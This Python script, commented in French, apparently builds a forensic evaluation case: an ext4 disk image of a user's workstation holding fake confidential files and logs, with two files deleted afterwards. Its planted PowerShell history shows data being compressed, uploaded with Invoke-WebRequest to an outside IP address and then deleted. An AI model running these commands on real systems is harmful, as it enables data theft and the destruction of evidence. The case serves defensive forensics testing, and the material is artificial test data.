#!/usr/bin/env python3
"""Generer le cas d'evaluation 'disk_image_data_exfiltration' (image disque ext4).

Scenario : sur le poste de jdoe, un document confidentiel est compresse puis
envoye vers un serveur externe via PowerShell ; le document original est
ensuite supprime. L'image contient aussi un historique bash et des journaux.

Prerequis : e2fsprogs (mkfs.ext4, debugfs). Usage :
    python eval/build_disk_case.py
"""

import os
import shutil
import subprocess  # nosec B404 - outils e2fsprogs locaux, arguments en liste
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
CASE = os.path.join(HERE, 'suite', 'disk_image_data_exfiltration')
IMAGE = os.path.join(CASE, 'poste_jdoe.img')

FILES = {
    'Users/jdoe/Documents/Projet_Orion/plan_strategique_2027.docx': b'PK\x03\x04 plan strategique Orion (confidentiel)\n',
    'Users/jdoe/Documents/Projet_Orion/budget_orion.xlsx': b'PK\x03\x04 budget Orion\n',
    'Users/jdoe/Documents/notes_reunion.txt': b'Reunion lundi 9h - point budget\n',
    'Users/jdoe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt': (
        b'Get-ChildItem C:\\Users\\jdoe\\Documents\\Projet_Orion\n'
        b'Compress-Archive -Path C:\\Users\\jdoe\\Documents\\Projet_Orion -DestinationPath C:\\Users\\Public\\maj_q3.zip\n'
        b'Invoke-WebRequest -Uri http://45.137.21.9:8080/upload -Method Put -InFile C:\\Users\\Public\\maj_q3.zip\n'
        b'Remove-Item C:\\Users\\Public\\maj_q3.zip\n'
        b'Remove-Item C:\\Users\\jdoe\\Documents\\Projet_Orion\\plan_strategique_2027.docx\n'
    ),
    'Users/Public/maj_q3.zip': b'PK\x03\x04 archive\n',
    'var/log/auth.log': (
        b'Oct 12 08:01:10 poste-jdoe sshd[812]: Accepted password for jdoe from 10.10.1.20 port 51522 ssh2\n'
    ),
}
DELETED = ['Users/jdoe/Documents/Projet_Orion/plan_strategique_2027.docx', 'Users/Public/maj_q3.zip']


def build():
    for tool in ('mkfs.ext4', 'debugfs'):
        if not shutil.which(tool):
            raise SystemExit(f'{tool} introuvable (paquet e2fsprogs)')
    root = tempfile.mkdtemp(prefix='phoenix_disk_case_')
    try:
        for rel, data in FILES.items():
            path = os.path.join(root, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'wb') as f:
                f.write(data)
        os.makedirs(CASE, exist_ok=True)
        if os.path.exists(IMAGE):
            os.remove(IMAGE)
        subprocess.run(['mkfs.ext4', '-q', '-F', '-L', 'POSTE-JDOE', '-d', root, IMAGE, '4M'],  # nosec B603 B607
                       check=True)
        for rel in DELETED:
            subprocess.run(['debugfs', '-w', '-R', f'rm /{rel}', IMAGE], check=True,  # nosec B603 B607
                           capture_output=True)
    finally:
        shutil.rmtree(root, ignore_errors=True)
    print(f'Image generee : {IMAGE}')


if __name__ == '__main__':
    build()
